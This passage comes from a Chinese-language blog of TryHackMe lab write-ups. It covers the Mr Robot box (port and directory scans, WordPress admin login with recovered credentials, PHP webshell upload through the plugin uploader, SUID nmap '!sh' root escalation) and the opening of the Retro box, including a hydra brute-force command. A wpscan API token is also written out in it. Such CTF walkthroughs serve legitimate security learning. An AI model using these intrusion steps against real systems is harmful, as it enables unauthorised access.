<span class="hljs-string">443/tcp open   ssl/http Apache httpd</span>
<span class="hljs-string">|_http-server-header: Apache</span>
<span class="hljs-string">|_http-title: Site doesn'</span>t have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: <span class="hljs-number">2015</span>-<span class="hljs-number">09</span>-<span class="hljs-number">16</span>T10:<span class="hljs-number">45</span>:<span class="hljs-number">03</span>
|_Not valid after:  <span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">13</span>T10:<span class="hljs-number">45</span>:<span class="hljs-number">03</span>
Device type: general purpose|specialized|storage-misc|broadband router|WAP|printer
Running (JUST GUESSING): Linux <span class="hljs-number">3</span>.X|<span class="hljs-number">4</span>.X|<span class="hljs-number">5</span>.X|<span class="hljs-number">2.6</span>.X (<span class="hljs-number">88%</span>), Crestron <span class="hljs-number">2</span>-Series (<span class="hljs-number">87%</span>), HP embedded (<span class="hljs-number">87%</span>), Asus embedded (<span class="hljs-number">86%</span>)
OS CPE: cpe:/o:linux:linux_kernel:<span class="hljs-number">3</span> cpe:/o:linux:linux_kernel:<span class="hljs-number">4</span> cpe:/o:linux:linux_kernel:<span class="hljs-number">5.4</span> cpe:/o:crestron:<span class="hljs-number">2</span>_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:<span class="hljs-number">2.6</span> cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:<span class="hljs-number">3.4</span>
Aggressive OS guesses: Linux <span class="hljs-number">3.10</span> - <span class="hljs-number">3.13</span> (<span class="hljs-number">88%</span>), Linux <span class="hljs-number">3.10</span> - <span class="hljs-number">4.11</span> (<span class="hljs-number">88%</span>), Linux <span class="hljs-number">3.12</span> (<span class="hljs-number">88%</span>), Linux <span class="hljs-number">3.13</span> (<span class="hljs-number">88%</span>), Linux <span class="hljs-number">3.13</span> or <span class="hljs-number">4.2</span> (<span class="hljs-number">88%</span>), Linux <span class="hljs-number">3.2</span> - <span class="hljs-number">3.5</span> (<span class="hljs-number">88%</span>), Linux <span class="hljs-number">3.2</span> - <span class="hljs-number">3.8</span> (<span class="hljs-number">88%</span>), Linux <span class="hljs-number">4.2</span> (<span class="hljs-number">88%</span>), Linux <span class="hljs-number">4.4</span> (<span class="hljs-number">88%</span>), Linux <span class="hljs-number">5.4</span> (<span class="hljs-number">88%</span>)
No exact OS matches for host (test conditions non-ideal).
Network Distance: <span class="hljs-number">2</span> hops

TRACEROUTE (using port <span class="hljs-number">22</span>/tcp)
HOP RTT       ADDRESS
<span class="hljs-number">1</span>   <span class="hljs-number">200.30</span> ms <span class="hljs-number">10.14</span>.<span class="hljs-number">0.1</span>
<span class="hljs-number">2</span>   <span class="hljs-number">200.79</span> ms <span class="hljs-number">10.10</span>.<span class="hljs-number">171.59</span>

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">29.09</span> seconds</code></pre>
<p>发现开启了三个端口，其中似乎之后80和443还有进一步利用的可能，我们访问地址，发现是一个虚拟机登录的过程（不需要我们操作）最终登陆之后，这里显示给我们一些命令。80和443端口都是这样的页面</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145178.png" alt="image-20240618093722234"></p>
<h2 id="目录探测">目录探测</h2>
<p>当我尝试了上述几个命令，发现只有join可以执行命令（但似乎只能输入邮箱），当我以为只能去绕过shell限制的时候，尝试了目录探测，发现是一个wordpress框架</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145179.png" alt="image-20240618095040189"></p>
<p>其实，单看这里也可以知道，少走弯路</p>
<pre><code class="hljs scss">gobuster dir -u "http://<span class="hljs-number">10.10</span>.<span class="hljs-number">171.59</span>/<span class="hljs-string">" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145180.png" alt="image-20240618095341414"></p>
<p>初步扫描结果如下，当然这时候还没有扫完，后续有新的结果，我们在讨论，首先这里我们逐个访问目录（防止遗漏重要信息）</p>
<p>其中有的目录重定向到403，显示我们禁止访问，当访问到RSS的时候，下载了一个文件，其中泄露了wp的版本信息</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">rss</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"2.0"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">channel</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>user's Blog!<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">atom:link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://10.10.171.59/feed/"</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"self"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"application/rss+xml"</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">link</span>&gt;</span>https://10.10.171.59<span class="hljs-tag">&lt;/<span class="hljs-name">link</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>Just another WordPress site<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">lastBuildDate</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">language</span>&gt;</span>en-US<span class="hljs-tag">&lt;/<span class="hljs-name">language</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">sy:updatePeriod</span>&gt;</span>hourly<span class="hljs-tag">&lt;/<span class="hljs-name">sy:updatePeriod</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">sy:updateFrequency</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">sy:updateFrequency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">generator</span>&gt;</span>http://wordpress.org/?v=4.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">generator</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">channel</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">rss</span>&gt;</span></code></pre>
<p>访问目录atom结果如下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145181.png" alt="image-20240618100500159"></p>
<p>这里为了高效率，我先采用wpscan进行初步的漏洞扫描</p>
<p>wp-login.php是一个登陆页面</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145182.png" alt="image-20240618101958069"></p>
<p>访问license目录发现关于密码的信息</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145183.png" alt="image-20240618102154997"></p>
<p>解密得：elliot:ER28-0652</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145184.png" alt="image-20240618102220910"></p>
<p>robots目录内容为</p>
<pre><code class="hljs scss">User-agent: *
fsocity.dic
key-<span class="hljs-number">1</span>-of-<span class="hljs-number">3</span>.txt</code></pre>
<p>phpmyadmin目录如下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145185.png" alt="image-20240618102515643"></p>
<h2 id="信息搜集">信息搜集</h2>
<pre><code class="hljs scss">wpscan <span class="hljs-attr">--url</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">171.59</span>/ -e vp --api-token WjvZf12T8mMWrRkopYBhoTCQ5tDZfdk0l0vxqNbEpwU</code></pre>
<p>这里的结果，似乎对我的帮助不大，就简单展示一下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145186.png" alt="image-20240618112137271"></p>
<p>只是单纯的扫出百个漏洞，但看起来误报是很多的，对我们帮助不大</p>
<p>这里我使用上述得到的用户名和密码尝试登录，也是成功登录上去了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145187.png" alt="image-20240618105004205"></p>
<p>回到之前，我们访问robots.txt给我们提示的目录，拿到key1</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145188.png" alt="image-20240618105949480"></p>
<p>同时访问fsocity.dic，得到了一组类似字典的东西</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145189.png" alt="image-20240618110959504"></p>
<h2 id="文件上传拿shell">文件上传拿Shell</h2>
<p>再次考虑之前的后台页面，尝试上传webshell，找到插件上传位置，上传准备好的php-webshell</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145190.png" alt="image-20240618113033680"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145191.png" alt="image-20240618113103547"></p>
<p>上传之后，可能会给你显示插件安装错误，这里不用管，我们跟到Media功能，就能发现我们上传的shell</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145192.png" alt="image-20240618113150443"></p>
<p>直接点击，访问文件所在路径即可，记得本地开监听</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145193.png" alt="image-20240618113328214"></p>
<p>找到robot用户下存在第二个key，但是无权访问，不过却给我们提供了robot的密码，在线网站解密一下即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145194.png" alt="image-20240618113315991"></p>
<pre><code class="hljs scss">abcdefghijklmnopqrstuvwxyz</code></pre>
<p>之后su切换用户即可</p>
<p>​	<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145195.png" alt="image-20240618113456963"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145196.png" alt="image-20240618113513772"></p>
<p>得到第二个key</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145197.png" alt="image-20240618114550223"></p>
<p>之后思路肯定就是尝试提权到root，不过这里走了很多弯路，但也不是没收获，先说一下弯路</p>
<p>主要是当时忘记列举suid了，我就先尝试信息搜集，找了半天配置文件，你也可以看到上图显示了phpmyadmin的密码信息，我以为还得峰回路转，回去搞一下phpmyadmin，结果是不需要的（当然我也没有成功拿下phpmyadmin）</p>
<p>因为phpmyadmin服务，只允许以localhost的host name访问，这里让我想着尝试ssh远程端口转发，但是目标服务器并没有开启22，而且，本身也没有权限去开启ssh，这导致我走入了死胡同，也就没思路了</p>
<pre><code class="hljs scss">ssh -L <span class="hljs-number">9090</span>:localhost:<span class="hljs-number">8080</span> robot@<span class="hljs-number">10.10</span>.<span class="hljs-number">171.59</span></code></pre>
<h2 id="提升权限">提升权限</h2>
<p>之后瞟了一两眼wp，发现他进行了suid列举，我就赶紧也尝试一下，同时结合了题目给的题目：nmap</p>
<p>可以看到下图里面也存在nmap的suid文件，那可以google或者gtfobins网站搜一下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145198.png" alt="image-20240618123957635"></p>
<p>看到下图的提权方式，这里我尝试suid这个提权方式，没成功，nmap报了一个错误，我也就没弄了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145199.png" alt="image-20240618124030122"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145200.png" alt="image-20240618124041997"></p>
<p>后来Google搜了一下，发现用下面的方式即可提权，当然版本限制为： 2.02-5.21</p>
<p>我们可以在交互模式中，提权到root</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145201.png" alt="image-20240618124100861"></p>
<p>我们可以看一下nmap交互模式的使用说明</p>
<pre><code class="hljs scss">map&gt; h
h
Nmap Interactive Commands:
n &lt;nmap args&gt; -- executes an nmap scan using the arguments given and
waits for nmap to finish.  Results are printed to the
screen (of course you can still use file output commands).
! &lt;command&gt;   -- runs shell command given in the foreground
x             -- Exit Nmap
f [--spoof &lt;fakeargs&gt;] [--nmap_path &lt;path&gt;] &lt;nmap args&gt;
-- Executes nmap in the background (results are NOT
printed to the screen).  You should generally specify a
file for results (with -oX, -oG, or -oN).  If you specify
fakeargs with --spoof, Nmap will try to make those
appear in ps listings.  If you wish to execute a special
version of Nmap, specify --nmap_path.
n -h          -- Obtain help with Nmap syntax
h             -- Prints this help screen.
Examples:
n -sS -O -v example.com/<span class="hljs-number">24</span>
f --spoof <span class="hljs-string">"/usr/local/bin/pico -z hello.c"</span> -sS -oN e.log example.com/<span class="hljs-number">24</span></code></pre>
<p>可以看到这里的!命令，能后使用shell命令，这导致我们可以!sh提权</p>
<p>更新一下，看了几篇wp，发现上述不能使用script形式提权的原因是这样的：</p>
<pre><code class="hljs scss">它不起作用。经过一番挖掘后，我意识到安装的 nmap 版本太旧，无法运行脚本。所以我回到谷歌并做了一些研究，看看是否有另一种方法可以让 nmap 为我运行一些东西。</code></pre>
<h2 id="killchain-summary">KillChain Summary</h2>
<p>总结一下：首先nmap扫描端口，发现22、80、443，不过22关闭的，只需要关注80或者443即可，随后访问IP地址，发现一些无用信息，不过看到url变化，我们能想到目录探测。</p>
<p>看到了众多目录，一个个访问，查看信息，发现这是一个wpCMS站，随后就是尝试根据已有的信息，拿到admin登录的用户名和密码，这里我是查看的某些目录获取到的，不过我看wp中，他们是凭借信息搜集，关联到这个Mr Robot的电影主角叫elliot，之后根据得到的fsocity.dic字典，利用wpscan进行用户名和密码枚举，成功进入后台。</p>
<p>后台getshell很常规。我们考虑编辑404文件或者上传plugin插件，之后访问拿到shell，随后就是常规提权。首先信息搜集，发现另一个用户的用户名和密码，随后su切换身份，拿到第二个key；之后就是提权到root，直接枚举suid，发现存在一个nmap的二进制文件，随后Google查到nmap这一低版本提权方法，利用交互模式缺陷，成功提权，拿到key3</p>
<p>参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/09/25/suid-executables/">SUID Executables</a></p>
<p><a target="_blank" rel="noopener" href="https://unicornsec.com/home/tryhackme-mr-robot-ctf">tryhackme - mr robot ctf</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">谈一谈Linux与suid提权</a>——P神！非常推荐，又学到了很多</p>
<h1 id="0x17-retro">0x17 Retro</h1>
<h2 id="靶机说明">靶机说明</h2>
<p>你能进行时间旅行吗？如果没有，您可能需要考虑下一个最好的事情。</p>
<p>请注意，该计算机不响应 ping (ICMP)，并且可能需要几分钟才能启动。</p>
<p><em>Retro 可以采取两条不同的路径。一种方法需要的试验和错误要少得多，但是两种方法都可以。如果您对这两条路径感到好奇，请查看文章。该房间的另一个版本可在其混音版本 <a target="_blank" rel="noopener" href="https://tryhackme.com/room/blaster">Blaster</a> 中找到。</em></p>
<h2 id="常规枚举">常规枚举</h2>
<p>nmap扫全端口，发现开启了80与3389端口，接着针对这两个端口进行深入扫描</p>
<pre><code class="hljs scss">nmap <span class="hljs-number">10.10</span><span class="hljs-selector-class">.83</span><span class="hljs-selector-class">.55</span> -Pn -p80,<span class="hljs-number">3389</span> -sV -sC -O</code></pre>
<pre><code class="hljs scss">Starting Nmap <span class="hljs-number">7.94S</span>VN ( https://nmap.org ) at <span class="hljs-number">2024</span>-<span class="hljs-number">07</span>-<span class="hljs-number">08</span> <span class="hljs-number">09</span>:<span class="hljs-number">27</span> CST
Nmap scan report for localhost (<span class="hljs-number">10.10</span>.<span class="hljs-number">83.55</span>)
Host is up (<span class="hljs-number">0.19s</span> latency).

PORT     STATE SERVICE       VERSION
<span class="hljs-number">80</span>/tcp   open  http          Microsoft IIS httpd <span class="hljs-number">10.0</span>
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/<span class="hljs-number">10.0</span>
|_http-title: IIS Windows Server
<span class="hljs-number">3389</span>/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: <span class="hljs-number">2024</span>-<span class="hljs-number">07</span>-<span class="hljs-number">07</span>T01:<span class="hljs-number">26</span>:<span class="hljs-number">10</span>
|_Not valid after:  <span class="hljs-number">2025</span>-<span class="hljs-number">01</span>-<span class="hljs-number">06</span>T01:<span class="hljs-number">26</span>:<span class="hljs-number">10</span>
|_ssl-date: <span class="hljs-number">2024</span>-<span class="hljs-number">07</span>-<span class="hljs-number">08</span>T01:<span class="hljs-number">28</span>:<span class="hljs-number">14</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; <span class="hljs-number">0s</span> from scanner <span class="hljs-selector-tag">time</span>.
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: <span class="hljs-number">10.0</span>.<span class="hljs-number">14393</span>
|_  System_Time: <span class="hljs-number">2024</span>-<span class="hljs-number">07</span>-<span class="hljs-number">08</span>T01:<span class="hljs-number">28</span>:<span class="hljs-number">09</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>
Warning: OSScan results may be unreliable because we could not find at least <span class="hljs-number">1</span> open and <span class="hljs-number">1</span> closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">20.01</span> seconds</code></pre>
<h2 id="目录探测">目录探测</h2>
<p>在这里我首先访问了web端口，利用插件得知该网站存在wordpress的CMS指纹，正当我兴奋的想使用wpscan进行利用的时候，现实给了我当头一棒，我天真的认为就是突破wordpress才行，不过尝试了半天，发现不可以。</p>
<p>其中我得知了该网站用户名是wade，而密码是我在后面看wp的时候才得知的，我以为</p>
<p>此外我还尝试了利用hydra进行破解，但时间太长我又没有耐心等</p>
<pre><code class="hljs scss">hydra -l wade -<span class="hljs-selector-tag">P</span> /usr/share/wordlists/rockyou<span class="hljs-selector-class">.txt</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.83</span><span class="hljs-selector-class">.55</span> http-post-<span class="hljs-selector-tag">form</span> "/retro/wp-login<span class="hljs-selector-class">.php</span>:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=%<span class="hljs-number">2</span>Fretro%<span class="hljs-number">2</span>Fwp-admin%<span class="hljs-number">2</span>F&amp;testcookie=<span class="hljs-number">1</span>:F=incorrect<span class="hljs-string">"</span></code></pre>
<p>之后看了wp发现还是信息搜集的不到位，并且思路被限制了，单纯认为就80端口可以突破，没有尝试3389的利用</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145202.png" alt="image-20240708104527959"></p>
<p>首先翻看帖子，就能看到上图的parzival关键词，我们有理由怀疑这是密码，由此我们可以尝试3389的登录</p>
